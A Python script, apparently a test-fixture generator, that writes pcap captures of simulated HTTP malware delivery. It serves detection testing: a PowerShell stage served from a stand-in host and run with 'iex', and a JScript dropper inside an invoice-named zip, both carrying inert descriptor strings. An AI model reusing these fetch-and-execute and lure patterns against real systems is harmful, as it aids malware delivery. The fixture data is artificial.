"""Writes the pcap_http_* fixture captures with dpkt's pcap Writer (independent of lib/codec's reader).
Usage: .venv/bin/python pcap_http_gen.py <outdir>"""
import base64, gzip, io, socket, sys, zipfile
import dpkt

CLI, SRV = socket.inet_aton("10.0.2.15"), socket.inet_aton("203.0.113.80")


def frame(src, dst, sp, dp, seq, ack, flags, data=b""):
    tcp = dpkt.tcp.TCP(sport=sp, dport=dp, seq=seq & 0xFFFFFFFF, ack=ack & 0xFFFFFFFF, flags=flags, win=65535, data=data)
    ip = dpkt.ip.IP(src=src, dst=dst, p=dpkt.ip.IP_PROTO_TCP, ttl=64, data=tcp)
    ip.len = len(ip)
    return bytes(dpkt.ethernet.Ethernet(src=b"\x02" * 6, dst=b"\x04" * 6, type=dpkt.ethernet.ETH_TYPE_IP, data=ip))


def capture(path, exchanges, cisn=0x1000, sisn=0xFFFFFF00, sport=49731):
    """exchanges: [(request bytes, [(offset, bytes) server segments])] in wire order; offsets are into the whole
    server -> client stream (out-of-order / retransmits allowed)."""
    A, S, F, P = dpkt.tcp.TH_ACK, dpkt.tcp.TH_SYN, dpkt.tcp.TH_FIN, dpkt.tcp.TH_PUSH
    fr = [frame(CLI, SRV, sport, 80, cisn, 0, S), frame(SRV, CLI, 80, sport, sisn, cisn + 1, S | A),
          frame(CLI, SRV, sport, 80, cisn + 1, sisn + 1, A)]
    c, tot = cisn + 1, 0
    for m, server_segs in exchanges:
        fr.append(frame(CLI, SRV, sport, 80, c, sisn + 1 + tot, P | A, m))
        c += len(m)
        for off, seg in server_segs:
            fr.append(frame(SRV, CLI, 80, sport, sisn + 1 + off, c, P | A, seg))
            tot = max(tot, off + len(seg))
    fr += [frame(SRV, CLI, 80, sport, sisn + 1 + tot, c, F | A), frame(CLI, SRV, sport, 80, c, sisn + 2 + tot, F | A)]
    with open(path, "wb") as f:
        w = dpkt.pcap.Writer(f, linktype=dpkt.pcap.DLT_EN10MB)
        for i, b in enumerate(fr):
            w.writepkt(b, ts=1760000000 + i * 0.01)


def chunked(b, n):
    return b"".join(b"%x\r\n" % len(b[i:i + n]) + b[i:i + n] + b"\r\n" for i in range(0, len(b), n)) + b"0\r\n\r\n"


def segs(b, n):
    return [(i, b[i:i + n]) for i in range(0, len(b), n)]


out = sys.argv[1]
PLAN1 = ("v=3|language=powershell|role=stage2|verdict=malicious|attack=T1105|adapter=http_fetch|stage_count=3|"
         "steps=fetch_stage,decode_stage,run_stage|campaign_id=PCAP-5eed0a17|url=http://cdn.example.invalid/s3.bin")
M1 = base64.b64encode(gzip.compress(PLAN1.encode(), mtime=0)).decode()
script1 = f"$descriptor_5eed0a17 = '{M1}'\r\niex $descriptor_5eed0a17\r\n".encode()
html = b"<html><body>ok</body></html>\n"
r1 = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n" % len(html) + html
r2 = (b"HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\nContent-Encoding: gzip\r\n"
      b"Transfer-Encoding: chunked\r\n\r\n" + chunked(gzip.compress(script1, mtime=0), 97))
ss = [(len(r1) + o, b) for o, b in segs(r2, 120)]
ss = [ss[0], ss[2], ss[1]] + ss[3:] + [ss[2]]          # out of order + one retransmit
capture(f"{out}/pcap_http_chunked_gzip.pcap",
        [(b"GET / HTTP/1.1\r\nHost: cdn.example.invalid\r\n\r\n", segs(r1, 120)),
         (b"GET /dl/stage2.ps1?id=7 HTTP/1.1\r\nHost: cdn.example.invalid\r\nUser-Agent: Mozilla/5.0\r\n"
          b"Accept-Encoding: gzip\r\n\r\n", ss)])

PLAN2 = ("v=3|language=jscript|role=dropper|verdict=malicious|attack=T1059.007|adapter=http_fetch|stage_count=2|"
         "steps=fetch_zip,run_jscript|campaign_id=PCAP-0b1ec7ed|file_path=%TEMP%\\\\upd.js")
M2 = base64.b64encode(gzip.compress(PLAN2.encode(), mtime=0)).decode()
zb = io.BytesIO()
with zipfile.ZipFile(zb, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("upd.js", f'var descriptor_0b1ec7ed = "{M2}";\r\nWScript.Echo(descriptor_0b1ec7ed);\r\n')
zb = zb.getvalue()
r = (b"HTTP/1.0 200 OK\r\nContent-Type: application/zip\r\nContent-Length: %d\r\n"
     b"Content-Disposition: attachment; filename=\"invoice_0b1e.zip\"\r\n\r\n" % len(zb)) + zb
capture(f"{out}/pcap_http_zip_cdisp.raw.pcap", [(b"GET /get?f=1 HTTP/1.0\r\nHost: 198.51.100.7\r\n\r\n",
        segs(r, 400))], cisn=0x7FFFFFF0, sisn=0x10, sport=50111)

bad = M1[:len(M1) // 2]                                  # truncated gzip: no plan, must stay undecoded
script3 = f"# updater\r\n$descriptor_dec0de00 = '{bad}'\r\nWrite-Host 'up to date'\r\n".encode()
r = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n" % len(script3) + script3
capture(f"{out}/pcap_http_decoy_truncgz.pcap",
        [(b"GET /check.ps1 HTTP/1.1\r\nHost: upd.example.invalid\r\n\r\n", segs(r, 200))])
print(PLAN1)
print(PLAN2)
